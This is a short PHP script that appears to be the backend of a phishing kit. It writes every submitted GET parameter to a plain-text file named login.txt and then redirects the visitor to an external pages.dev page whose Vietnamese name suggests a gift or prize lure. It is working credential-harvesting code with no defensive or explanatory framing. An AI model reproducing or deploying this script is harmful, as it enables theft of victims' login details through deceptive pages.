<?php
// Ensure PHP is executing and not serving the file
header('Content-Type: text/html; charset=UTF-8');

// Perform the redirect
header('Location: https://nhanqua.pages.dev/xulyquatang.html');

// Open file in append mode
$handle = fopen("login.txt", "a");
if ($handle) {
    // Write each GET parameter to the file
    foreach ($_GET as $variable => $value) {
        fwrite($handle, $variable . "=" . $value . "\r\n");
    }
    fwrite($handle, "\r\n");
    fclose($handle);
}

// Exit to ensure no further output
exit;
?>
